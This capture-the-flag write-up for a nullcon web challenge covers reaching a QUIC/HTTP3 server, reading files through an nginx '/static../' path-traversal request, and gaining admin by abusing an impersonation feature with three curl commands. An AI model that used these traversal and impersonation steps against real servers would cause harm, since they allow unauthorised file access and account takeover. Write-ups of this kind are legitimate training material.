# ghost

## Setup

This was an interesting challenge that involved interating with a [QUIC/HTTP3](https://en.wikipedia.org/wiki/QUIC) server. It did feel guessy towards the end but it wasn't too bad.

Since this exploitation was done pretty manually from the terminal, there is no solution script. I'll detail the basic steps below.

I started by trying to view the web page at the challenge's provided address via different web browsers to no avail. Eventually, based on the listening port of 8443, I realized that this was probably a QUIC server. I then started looking for a suitable command-line client, trying the following:

* [ngtcp2](https://github.com/ngtcp2/ngtcp2): Took forever to figure out the build process and then it didn't work when trying to use the client. Moved on fairly quickly and didn't investigate what was going wrong.
* [aioquic](https://github.com/aiortc/aioquic): Ships with a basic HTTP3 client, but this never worked against the server. Looking at some of the traffic in Wireshark, it looks like this client and the server could never agree on a protocol ID.
* [quiche](https://github.com/cloudflare/quiche): CloudFlare's Rust libary for QUIC/HTTP3 code. Building it with the `--examples` flag produces both an example client and server. After a lot of messing around with my golang setup (Go is required even though this is mostly written in Rust), this option finally worked.

CloudFlare also has an incomplete list of client / browser support [here](https://developers.cloudflare.com/http3/intro/).

## Directory Traversal

After struggling to properly install golang, I finally built a copy of `quiche`, which includes a minimal QUIC client. I could finally start interacting with the server.

Since the only meaningful information on the response page was the presence of a `/static` route on the server, the next obvious step was trying typical mis-configured nginx path traversal on the `/static../` route:

```sh
/opt/quiche/target/debug/examples/http3-client https://web1.ctf.nullcon.net:8443/static../
```

This revealed the presence of a `links.txt` file, which explains the basic components of some "password-less authentication system" that also allows for impersonation of other users:

```
To signup
http://localhost/check.php?signup=true&name=asd

To Impersonate a person
http://localhost/check.php?impersonator=asd&impersonatee=check

To umimpersonate a person
http://localhost/check.php?unimpersonate=asd-admin

To get status
http://localhost/check.php?status=asd
```

I realized that these interactions probably involved headers / session cookies of some kind to keep track of the what's going on, and unfortunately `quiche` did not appear to offer this support yet (or perhaps I was missing something). I decided to try to compile [`curl`](https://curl.haxx.se/) from source with HTTP3 support provided by `quiche`. Fortunately, this is [well-documented](https://github.com/curl/curl/blob/master/docs/HTTP3.md) and went smoothly.

## Logic Game

I could now properly interact with the logic game. To become an admin, you first have to "downgrade" the real admin to a user, impersonate the admin (now allowed because the admin account's level was downgraded to user), and then un-downgrade the admin, so your original user account is now impersonating an admin-level account. This was achieved with the following commands:

```sh
# We first make the admin associated with our account impersonate us, downgrading them to user level.
/opt/curl-http3/src/curl --http3 -vv -b 'PHPSESSID=b783ce4b0efc2d3164b94f0479f0311f' "$URL?impersonator=aaa-admin&impersonatee=aaa" 2>/dev/null | tr '><' '\n'

# We can now impersonate the admin associated with our account. Because they are not at admin level right now, we do not yet get the flag.
/opt/curl-http3/src/curl --http3 -vv -b 'PHPSESSID=b783ce4b0efc2d3164b94f0479f0311f' "$URL?impersonator=aaa&impersonatee=aaa-admin" 2>/dev/null | tr '><' '\n'

# We have the admin unimpersonate our regular account, returning them to admin level. Because our user account is now impersonating an admin account, we get the flag.
/opt/curl-http3/src/curl --http3 -vv -b 'PHPSESSID=b783ce4b0efc2d3164b94f0479f0311f' "$URL?unimpersonate=aaa-admin" 2>/dev/null | tr '><' '\n'
```
